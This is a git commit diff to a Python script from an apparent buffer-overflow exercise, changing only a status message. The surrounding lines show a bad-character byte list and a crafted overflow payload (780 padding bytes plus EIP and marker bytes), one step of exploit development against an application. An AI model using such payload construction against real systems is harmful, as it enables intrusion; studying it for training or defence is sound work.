5290df73ac236a7f80e1073f2b4c69fcfb4a918b
Josh Giddings <75488156+giddings32@users.noreply.github.com>
2022-08-09 09:12:31 -0400

    Update 5_badchars.py

--- Buffer_Overflow/App_Web_Portal/5_badchars.py
+++ Buffer_Overflow/App_Web_Portal/5_badchars.py
@@ -24,7 +24,7 @@ badchars = (
 "\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff" )
 
 try:
-  print "\nOverwriting EIP..."
+  print "\nLocating Bad Characters..."
 
   shellcode = "A" * 780 + "B" * 4 + "C" * 4 + badchars
   
